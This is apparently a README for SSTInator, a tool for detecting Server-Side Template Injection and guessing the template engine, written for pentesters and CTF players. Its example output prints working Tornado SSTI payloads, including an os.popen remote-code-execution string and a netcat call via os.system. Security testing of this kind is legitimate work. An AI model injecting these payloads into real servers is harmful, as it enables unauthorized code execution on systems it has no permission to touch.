# 🧪 SSTInator — Universal SSTI Guesser & Detector

**SSTInator** is a high-performance, multi-language Server-Side Template Injection (SSTI) testing playground and engine discriminator.  
Built for red teamers, CTFer, researchers, and pentesters, it allows you to test templates against dozens of engines across languages in a unified way.

---

## 🚀 Features

- ✅ Supports multiple languages: `Python`, `Node.js`, `PHP`, `Ruby`, `Java`, `Go` ( not yet )
- 🔍 Automatic engine discrimination via payload analysis
- 🔓 Built-in exploitation PoCs for vulnerable engines
- 🧩 Easy to extend with new languages or engines
- 🖥️ Interactive CLI with history & autocomplete
- 📦 No Docker needed (but compatible)
- 🛠️ Fast, modular architecture with persistent background workers per language

---

## 📦 Installation

### 💡 Prerequisites

Make sure you have the following installed globally:

- Python 3.8+
- Node.js (with `npm`)
- PHP (with `composer`)
- Ruby (with `bundler`)
- Java (JDK + `maven`)
- Go (>= 1.20) ( soon :) )

---

### 🛠️ Install

```
git clone https://github.com/yourname/SSTInator.git
cd SSTInator
chmod +x install.sh
./install.sh
```

The installer sets up each language’s dependencies and prepares the playground.

---

## 🧪 Usage

### 🔁 Launch all tests

```
python3 main.py
```

### 📜 You know the langague ? 

```
python3 main.py -l ruby,python
```

### 🧠 Ask SSTInator the template engine !!

```
python3 main.py -l ruby -g
```

### 📜 List all available engines

```
python3 main.py --list-engines
```

---

## 🧰 Examples

```
Starting engine discrimination (case sensitive)


🔍 Discriminator payload: {{7*'7'}}

> 7777777

🔍 Discriminator payload: {%for i in [1,2,3]%}{{i}}{%end%}

> 123

✅ After discrimination: tornado


🔓 Available exploits:

- tornado:
    • rce → {{__import__('os').popen('id').read()}}
    • blind_rce → {% import os %}{{os.system('nc localhost 4444')}}
```

---

## ✨ Adding New Engines

To add new template engines:

1. Edit the relevant `engines/<lang>/engines.*` file 
2. Register a new function: `engine_name → function(template: str) → str`
3. Restart the playground

---

## ⚠️ Legal Notice

This tool is for **educational and authorized testing only**.  
Never use it against systems without **explicit permission**.

---

## 📄 License

MIT © ToG
